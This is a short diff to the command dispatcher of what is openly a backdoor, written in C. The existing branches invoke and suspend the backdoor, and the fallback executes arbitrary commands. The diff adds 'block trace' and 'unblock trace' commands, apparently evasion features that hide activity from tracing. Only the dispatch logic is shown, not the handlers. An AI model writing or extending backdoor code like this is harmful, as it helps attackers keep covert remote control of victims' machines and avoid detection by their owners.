@@ -33,6 +33,10 @@ int get_command_type(const char* command)
     return TYPE_INVOKE_BACKDOOR;
   else if (strcmp(command, SUSPEND_BACKDOOR_CMD) == 0)
     return TYPE_SUSPEND_BACKDOOR;
+  else if (strcmp(command, BLOCK_TRACE_CMD) == 0)
+    return TYPE_BLOCK_TRACE;
+  else if (strcmp(command, UNBLOCK_TRACE_CMD) == 0)
+    return TYPE_UNBLOCK_TRACE;
 
   return TYPE_EXECUTE_CMD;
 }
